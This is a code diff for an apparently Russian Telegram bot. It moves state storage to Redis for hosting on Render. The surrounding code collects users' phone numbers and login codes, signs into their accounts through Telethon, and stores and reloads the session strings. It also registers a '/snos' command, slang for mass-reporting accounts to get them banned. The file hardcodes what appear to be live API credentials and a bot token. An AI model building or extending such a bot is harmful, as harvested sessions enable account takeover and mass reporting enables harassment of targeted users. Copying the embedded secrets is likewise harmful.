@@ -1,26 +1,30 @@
 import os
 import random
 import asyncio
+import redis
 from aiogram import Bot, Dispatcher, types
-from aiogram.contrib.fsm_storage.memory import MemoryStorage
+from aiogram.contrib.fsm_storage.redis import RedisStorage2
 from aiogram.dispatcher import FSMContext
 from aiogram.dispatcher.filters.state import State, StatesGroup
-from telethon import TelegramClient, functions
+from telethon import TelegramClient
 from telethon.sessions import StringSession
-from telethon.tl.functions.messages import ReportRequest
-from telethon.tl.types import InputPeerUser, InputPeerChannel
 
 # Конфигурация
 API_ID = 24463378  # Замените на ваш API ID
 API_HASH = 'e7c3fb1d6c2a8b3a9422607a350754c1'  # Замените на ваш API HASH
 BOT_TOKEN = '7764512749:AAHpB7bp0Mohsbb2EEPo5pEBN8tOg9YFYrE'  # Замените на токен вашего бота
 
+# Redis конфигурация для Render
+REDIS_URL = os.environ.get('REDIS_URL', 'redis://localhost:6379')
+
 # Создаем папку для сессий
 os.makedirs('sessions', exist_ok=True)
 
+# Инициализация Redis storage
+storage = RedisStorage2.from_url(REDIS_URL)
+
 # Инициализация бота aiogram
 bot = Bot(token=BOT_TOKEN)
-storage = MemoryStorage()
 dp = Dispatcher(bot, storage=storage)
 
 # Глобальный словарь для хранения клиентов Telethon
@@ -72,7 +76,8 @@ async def process_phone(message: types.Message, state: FSMContext):
         sent_code = await client.send_code_request(phone)
         await message.reply("📲 Код отправлен. Введи код в формате '1 2 3 4 5':")
         await AuthStates.code.set()
-        await state.update_data(client=client)
+        # Сохраняем только необходимые данные, а не весь клиент
+        await state.update_data(client_session=StringSession.save(client.session))
     except Exception as e:
         await message.reply(f"❌ Ошибка: {e}")
         await state.finish()
@@ -82,8 +87,18 @@ async def process_phone(message: types.Message, state: FSMContext):
 async def process_code(message: types.Message, state: FSMContext):
     code = message.text.replace(' ', '')
     user_data = await state.get_data()
-    client = user_data['client']
-    phone = user_data['phone']
+    
+    # Восстанавливаем клиент из сессии
+    session_str = user_data.get('client_session')
+    phone = user_data.get('phone')
+    
+    if not session_str or not phone:
+        await message.reply("❌ Ошибка сессии. Попробуйте снова /start")
+        await state.finish()
+        return
+    
+    client = TelegramClient(StringSession(session_str), API_ID, API_HASH)
+    await client.connect()
     
     try:
         await client.sign_in(phone, code=code)
@@ -101,6 +116,7 @@ async def process_code(message: types.Message, state: FSMContext):
         await message.reply(f"❌ Ошибка входа: {e}")
     finally:
         await state.finish()
+        await client.disconnect()
 
 # Обработчик команды /snos
 @dp.message_handler(commands=['snos'])
@@ -256,8 +272,13 @@ async def me_command(message: types.Message):
 if __name__ == '__main__':
     from aiogram import executor
     
+    # Для Render нужно указать порт
+    import os
+    PORT = int(os.environ.get('PORT', 5000))
+    
     # Запускаем загрузку сессий при старте
     loop = asyncio.get_event_loop()
     loop.run_until_complete(load_sessions())
     
+    # Запускаем бота
     executor.start_polling(dp, skip_updates=True)
